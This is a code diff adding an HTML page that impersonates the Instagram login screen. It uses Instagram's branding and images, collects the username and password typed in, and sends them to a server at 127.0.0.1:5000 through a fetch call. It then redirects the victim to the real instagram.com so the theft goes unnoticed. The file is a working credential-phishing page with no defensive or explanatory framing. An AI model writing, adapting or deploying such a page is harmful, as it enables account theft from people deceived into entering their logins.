@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container" id="app">
+        <div class="phone-container">
+            <img src="https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png" alt="Instagram" class="phone-image" id="headerImg">
+        </div>
+        <div class="login-container">
+            <div class="login-box">
+                <h1>Instagram</h1>
+                <form action="#">
+                    <input type="text" placeholder="Phone number, username, or email" required v-model="username">
+                    <input type="password" placeholder="Password" required v-model="password">
+                    <button type="submit" @click.prevent="login">Log In</button>
+                    <div class="separator">OR</div>
+                    <a href="#" class="facebook-login">Log in with Facebook</a>
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </form>
+            </div>
+            <div class="signup-box">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <script>
+        let app = Vue.createApp({
+            data() {
+                return {
+                    username: '',
+                    password: ''
+                }
+            },
+            methods: {
+                async login() {
+                    const response = await fetch(`http://127.0.0.1:5000/login/${this.username}:${this.password}`)
+                    const tempData = await response.json()
+                    this.data = tempData.processedData
+                    this.redirect()
+                },
+                redirect() {
+                    window.location.href = "https://www.instagram.com"
+                }
+            }
+        })
+
+        app.mount('#app')
+    </script>
+</body>
+</html>
